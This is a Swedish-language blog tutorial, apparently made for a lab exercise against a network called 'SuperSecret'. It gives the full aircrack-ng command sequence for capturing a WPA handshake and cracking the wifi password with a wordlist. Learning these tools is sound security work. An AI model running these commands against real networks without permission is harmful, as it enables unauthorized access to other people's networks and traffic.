+++
title = "Hacka wifi nätverk"
date = "2023-10-11T14:08:14+02:00"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["", ""]
keywords = ["", ""]
description = ""
showFullContent = false
readingTime = false
hideComments = false
color = "" #color from the theme settings
+++

# Knäck wifi-nätverk

Ta reda på vad nätverkskortet heter med hjälp av kommandot ip i linux:

    ip a

Output:

    20: wlp0s20f3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 4c:1d:96:22:73:84 brd ff:ff:ff:ff:ff:ff

    inet 192.168.20.236/24 brd 192.168.20.255 scope global dynamic noprefixroute wlp0s20f3
       valid_lft 86042sec preferred_lft 86042sec
    inet6 fe80::7569:fafd:9c24:6600/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever

Här printas informationen kring alla mina nätverkskort ut och
wlp0s20f3 heter mitt wifi nätverkskort. 

Nu behöver vi stoppa alla processer som använder nätverkskortet med hjälp av airmon-ng så att vi kan använda nätverkskortet för att lyssna av den trådlösa trafiken

    sudo airmon-ng check kill wlp0s20f3

Starta så att nätverkskortet läser alla signaler på wifi nätverket

    sudo airmon-ng start wlp0s20f3

Starta så att ni ser alla signaler som "flyger" genom luften

    sudo airodump-ng wlp0s20f3mon

### Se till så ni skriver **mon** på slutet

Nu borde ni hitta någon accesspunkt bland det som airodump spottar ur sig som heter "*SuperSecret*", det är det
nätverket som vi vill attackera.

Nu ska vi säga till airodump att vi vill fånga all trafik som går till just den accesspunkten, och med hjälp av den trafiken ta reda på vad lösenordet är för nätverket. Det vi behöver veta är vilken 2.4GHz kanal nätverket och vilket ssid nätverket har

    sudo airodump-ng wlp0s20f3mon --channel *KANALEN* --bssid *MAC_ADRESS* -w *SÖKVÄGEN TILL ETT DOKUMENT DÄR VI SPARARA NER INFORMATIONEN*
   

Det som vi är intresserade av är trafiken som sker när en användare med lösenord försöker koppla upp sig, nu får man vänta på att någon gör det. När det är klart kan ni avbryta avlyssningen med "Q" på tangentbordet eller CTRL+C

Nu har vi allt vi behöver för att knäcka lösenordet, nu ska datorn få jobba lite granna. Vi har lösenordet men det är  "hashat". Men om vi "hashar" en massa vanliga ord så kan vi få ut samma hash och på den vägen ta reda på lösenordet

Det gör man med hjälp av:

    sudo aircrack-ng -w *SÖKVÄG TILL FIL MED MASSA LÖSENORD SOM VI SKA TESTA* *SÖKVÄG TILL FILEN SOM VI HAR SPARAT NÄTVERKSTRAFIK I*

Här får datorn jobba en stund men förhoppningsvis blir den färdig om inte allt för lång tid. Och när vi har lösenordet till nätverket måste vi ställa in så att nätverkskortet kan fungera som vanligt med:

    sudo airmon-ng stop wlp0s20f3mon
    sudo systemctl start NetworkManager

Nu borde nätverkskortet fungera som vanligt igen
